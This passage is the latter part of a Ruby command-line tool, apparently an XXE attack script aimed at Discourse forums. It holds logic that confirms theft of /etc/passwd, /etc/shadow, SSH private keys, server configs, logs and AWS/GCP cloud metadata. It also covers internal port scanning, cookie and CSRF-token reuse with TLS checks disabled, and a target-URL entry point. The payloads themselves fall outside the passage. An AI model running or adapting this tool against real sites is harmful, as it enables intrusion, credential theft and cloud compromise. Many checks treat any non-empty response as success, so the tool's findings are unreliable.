      response.body.include?('localhost') || response.body.include?('127.0.0.1')
    elsif payload.include?('/proc/version')
      response.body.include?('Linux version')
    elsif payload.include?('win.ini')
      response.body.include?('[fonts]')
    elsif payload.include?('boot.ini')
      response.body.include?('[boot loader]')
    else
      response.body.length > 0
    end
  end
  
  def check_directory_listing_success(response)
    return false unless response && response.code.to_i < 500
    
    # Check for directory listing indicators
    directory_indicators = [
      'drwx',
      'total',
      'bin',
      'etc',
      'var',
      'usr',
      'home'
    ]
    
    directory_indicators.any? { |indicator| response.body.include?(indicator) }
  end
  
  def check_sensitive_file_success(response, payload)
    return false unless response && response.code.to_i < 500
    
    if payload.include?('id_rsa')
      response.body.include?('BEGIN') && response.body.include?('PRIVATE KEY')
    elsif payload.include?('nginx.conf')
      response.body.include?('server') || response.body.include?('location')
    elsif payload.include?('apache2.conf')
      response.body.include?('ServerRoot') || response.body.include?('DocumentRoot')
    elsif payload.include?('postgresql.conf')
      response.body.include?('port') || response.body.include?('listen_addresses')
    elsif payload.include?('redis.conf')
      response.body.include?('port') || response.body.include?('bind')
    elsif payload.include?('auth.log')
      response.body.match(/\w{3}\s+\d{1,2}\s+\d{2}:\d{2}:\d{2}/)
    else
      response.body.length > 0
    end
  end
  
  def check_ssrf_xxe_success(response, payload)
    return false unless response && response.code.to_i < 500
    
    if payload.include?('169.254.169.254')
      # AWS metadata
      response.body.include?('ami-id') || response.body.include?('instance-id')
    elsif payload.include?('metadata.google.internal')
      # GCP metadata
      response.body.include?('project') || response.body.include?('instance')
    elsif payload.include?('127.0.0.1') || payload.include?('localhost')
      # Local services
      response.body.length > 0 && !response.body.include?('Connection refused')
    else
      response.body.length > 0
    end
  end
  
  def check_port_scan_success(response, port)
    return false unless response
    
    # Check if port is open based on response
    if response.code.to_i < 500 && response.body.length > 0
      !response.body.include?('Connection refused') && !response.body.include?('timeout')
    else
      false
    end
  end
  
  def check_internal_network_success(response, ip)
    return false unless response && response.code.to_i < 500
    
    response.body.length > 0 && !response.body.include?('Connection refused')
  end
  
  def check_parameter_entity_success(response)
    return false unless response
    
    # Check for parameter entity processing
    response.code.to_i < 500 && (response.body.length > 0 || response.body.include?('entity'))
  end
  
  def check_utf16_xxe_success(response)
    return false unless response && response.code.to_i < 500
    
    response.body.match(/root:.*:0:0:/) || response.body.length > 0
  end
  
  def check_svg_xxe_success(response)
    return false unless response && response.code.to_i < 500
    
    response.body.match(/root:.*:0:0:/) || response.body.include?('uploaded')
  end
  
  def check_docx_xxe_success(response)
    return false unless response && response.code.to_i < 500
    
    response.body.match(/root:.*:0:0:/) || response.body.include?('uploaded')
  end
  
  def check_upload_xxe_success(response)
    return false unless response && response.code.to_i < 500
    
    response.body.match(/root:.*:0:0:/) || response.body.include?('uploaded')
  end
  
  def check_import_xxe_success(response)
    return false unless response && response.code.to_i < 500
    
    response.body.match(/root:.*:0:0:/) || response.body.include?('imported')
  end
  
  def check_export_xxe_success(response)
    return false unless response && response.code.to_i < 500
    
    response.body.match(/root:.*:0:0:/) || response.body.include?('exported')
  end
  
  def check_backup_xxe_success(response)
    return false unless response && response.code.to_i < 500
    
    response.body.match(/root:.*:0:0:/) || response.body.include?('backup')
  end
  
  def check_plugin_xxe_success(response)
    return false unless response && response.code.to_i < 500
    
    response.body.match(/root:.*:0:0:/) || response.body.length > 0
  end
  
  def check_admin_xxe_success(response)
    return false unless response && response.code.to_i < 500
    
    response.body.match(/root:.*:0:0:/) || response.body.length > 0
  end
  
  def check_api_xxe_success(response)
    return false unless response && response.code.to_i < 500
    
    response.body.match(/root:.*:0:0:/) || response.body.length > 0
  end
  
  def check_http_xxe_success(response)
    return false unless response && response.code.to_i < 500
    
    # Check for successful HTTP request indicators
    response.body.include?('HTTP') || response.body.include?('html') || response.body.length > 100
  end
  
  # Helper methods for determining severity and extracting evidence
  def determine_xxe_severity(payload)
    if payload.include?('file:///etc/passwd') || payload.include?('file:///etc/shadow')
      'Critical'
    elsif payload.include?('http://') || payload.include?('ftp://')
      'High'
    else
      'Medium'
    end
  end
  
  def extract_xxe_evidence(body, payload)
    evidence = []
    
    if payload.include?('file:///etc/passwd') && body.match(/root:.*:0:0:/)
      evidence << 'passwd file disclosed'
    elsif payload.include?('file:///etc/shadow') && body.include?('root:$')
      evidence << 'shadow file disclosed'
    elsif payload.include?('http://') && body.length > 0
      evidence << 'HTTP request successful'
    elsif payload.include?('ftp://') && body.length > 0
      evidence << 'FTP request successful'
    end
    
    evidence << 'XXE processing detected' if evidence.empty? && body.length > 0
    evidence
  end
  
  def extract_file_disclosure_evidence(body, payload)
    evidence = []
    
    if payload.include?('/etc/passwd') && body.match(/root:.*:0:0:/)
      evidence << 'Root user entry found'
    elsif payload.include?('/etc/shadow') && body.include?('root:$')
      evidence << 'Password hashes found'
    elsif payload.include?('/proc/version') && body.include?('Linux')
      evidence << 'Kernel version disclosed'
    end
    
    evidence << 'File content disclosed' if evidence.empty?
    evidence
  end
  
  def extract_sensitive_file_evidence(body, payload)
    evidence = []
    
    if payload.include?('id_rsa') && body.include?('PRIVATE KEY')
      evidence << 'SSH private key disclosed'
    elsif payload.include?('nginx.conf') && body.include?('server')
      evidence << 'Nginx configuration disclosed'
    elsif payload.include?('apache2.conf') && body.include?('ServerRoot')
      evidence << 'Apache configuration disclosed'
    end
    
    evidence << 'Sensitive file disclosed' if evidence.empty?
    evidence
  end
  
  def extract_ssrf_evidence(body, payload)
    evidence = []
    
    if payload.include?('169.254.169.254') && body.include?('ami-id')
      evidence << 'AWS metadata accessed'
    elsif payload.include?('metadata.google.internal') && body.include?('project')
      evidence << 'GCP metadata accessed'
    elsif payload.include?('127.0.0.1') && body.length > 0
      evidence << 'Local service accessed'
    end
    
    evidence << 'SSRF via XXE successful' if evidence.empty?
    evidence
  end
  
  def extract_error_evidence(body)
    error_types = []
    
    if body.include?('XML parsing error')
      error_types << 'XML parsing error'
    end
    
    if body.include?('External entity')
      error_types << 'External entity error'
    end
    
    if body.include?('libxml')
      error_types << 'libxml error'
    end
    
    error_types << 'XML processing error' if error_types.empty?
    error_types
  end
  
  def extract_csrf_token
    begin
      response = make_request(URI("#{@target_url}/"), 'GET')
      if response && response.body
        # Extract CSRF token from meta tag
        if match = response.body.match(/name="csrf-token"\s+content="([^"]+)"/)
          @csrf_token = match[1]
        end
        
        # Extract session cookies
        if response['Set-Cookie']
          @session[:cookies] = response['Set-Cookie']
        end
      end
    rescue => e
      puts "[!] Failed to extract CSRF token: #{e.message}"
    end
  end
  
  def make_request(uri, method, body = nil, headers = {})
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = uri.scheme == 'https'
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE if http.use_ssl?
    http.read_timeout = @timeout
    http.open_timeout = @timeout
    
    # Set proxy if provided
    if @proxy
      proxy_uri = URI(@proxy)
      http = Net::HTTP.new(uri.host, uri.port, proxy_uri.host, proxy_uri.port)
    end
    
    # Default headers
    default_headers = {
      'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language' => 'en-US,en;q=0.5',
      'Accept-Encoding' => 'gzip, deflate',
      'Connection' => 'keep-alive'
    }
    
    # Add session cookies
    if @session[:cookies]
      default_headers['Cookie'] = @session[:cookies]
    end
    
    headers = default_headers.merge(headers)
    
    request = case method.upcase
    when 'GET'
      Net::HTTP::Get.new(uri.request_uri, headers)
    when 'POST'
      req = Net::HTTP::Post.new(uri.request_uri, headers)
      req.body = body if body
      req
    when 'PUT'
      req = Net::HTTP::Put.new(uri.request_uri, headers)
      req.body = body if body
      req
    when 'DELETE'
      Net::HTTP::Delete.new(uri.request_uri, headers)
    end
    
    begin
      response = http.request(request)
      return response
    rescue => e
      puts "[!] Request failed: #{e.message}" if @verbose
      return nil
    end
  end
  
  def make_post_request(url, form_data)
    uri = URI(url)
    body = URI.encode_www_form(form_data)
    
    make_request(uri, 'POST', body, {
      'Content-Type' => 'application/x-www-form-urlencoded',
      'X-CSRF-Token' => @csrf_token || '',
      'X-Requested-With' => 'XMLHttpRequest'
    })
  end
  
  def add_vulnerability(vuln_data)
    @results[:vulnerabilities] << vuln_data
    @results[:vulnerable] = true
    @results[:summary][:successful_tests] += 1
    
    case vuln_data[:severity]
    when 'Critical'
      @results[:summary][:critical_vulns] += 1
    when 'High'
      @results[:summary][:high_vulns] += 1
    when 'Medium'
      @results[:summary][:medium_vulns] += 1
    when 'Low'
      @results[:summary][:low_vulns] += 1
    end
    
    puts "  ‚úì #{vuln_data[:severity]} XXE: #{vuln_data[:test_type]}"
  end
  
  def print_results
    puts "\n" + "=" * 60
    puts "DISCOURSE XXE TEST RESULTS"
    puts "=" * 60
    puts "Target: #{@target_url}"
    puts "Vulnerable: #{@results[:vulnerable] ? 'YES' : 'NO'}"
    puts "Total Tests: #{@results[:summary][:total_tests]}"
    puts "Successful Tests: #{@results[:summary][:successful_tests]}"
    puts "Critical Vulnerabilities: #{@results[:summary][:critical_vulns]}"
    puts "High Vulnerabilities: #{@results[:summary][:high_vulns]}"
    puts "Medium Vulnerabilities: #{@results[:summary][:medium_vulns]}"
    puts "Low Vulnerabilities: #{@results[:summary][:low_vulns]}"
    
    if @results[:vulnerabilities].any?
      puts "\nVulnerabilities Found:"
      @results[:vulnerabilities].each_with_index do |vuln, index|
        puts "  #{index + 1}. #{vuln[:severity]} - #{vuln[:endpoint]} (#{vuln[:test_type]})"
        puts "     Content-Type: #{vuln[:content_type]}"
        puts "     Evidence: #{vuln[:evidence].join(', ')}" if vuln[:evidence].any?
      end
    end
  end
  
  def save_results
    begin
      File.write('discourse_xxe_results.json', JSON.pretty_generate(@results))
      puts "\n[+] Results saved to discourse_xxe_results.json"
    rescue => e
      puts "[!] Failed to save results: #{e.message}"
    end
  end
end

# Main execution
if __FILE__ == $0
  require 'optparse'
  require 'securerandom'
  require 'openssl'
  
  options = {}
  
  OptionParser.new do |opts|
    opts.banner = "Usage: #{$0} [options]"
    
    opts.on('-u', '--url URL', 'Target Discourse URL') do |url|
      options[:url] = url
    end
    
    opts.on('-p', '--proxy PROXY', 'Proxy URL (e.g., http://127.0.0.1:8080)') do |proxy|
      options[:proxy] = proxy
    end
    
    opts.on('-t', '--timeout TIMEOUT', Integer, 'Request timeout in seconds (default: 10)') do |timeout|
      options[:timeout] = timeout
    end
    
    opts.on('-h', '--help', 'Show this help message') do
      puts opts
      exit
    end
  end.parse!
  
  unless options[:url]
    puts "Error: Target URL is required"
    puts "Usage: #{$0} -u <target_url> [options]"
    exit 1
  end
  
  begin
    tester = DiscourseXXE.new(options[:url], options)
    results = tester.run_all_tests
    
    puts "\nüéØ XXE testing completed!"
    puts "üìä Found #{results[:summary][:successful_tests]} vulnerabilities out of #{results[:summary][:total_tests]} tests"
    
    if results[:vulnerable]
      puts "‚ö†Ô∏è  Target appears to be vulnerable to XXE attacks!"
      exit 1
    else
      puts "‚úÖ No XXE vulnerabilities detected"
      exit 0
    end
    
  rescue Interrupt
    puts "\n[!] Testing interrupted by user"
    exit 1
  rescue => e
    puts "[!] Error during testing: #{e.message}"
    puts e.backtrace if $DEBUG
    exit 1
  end
end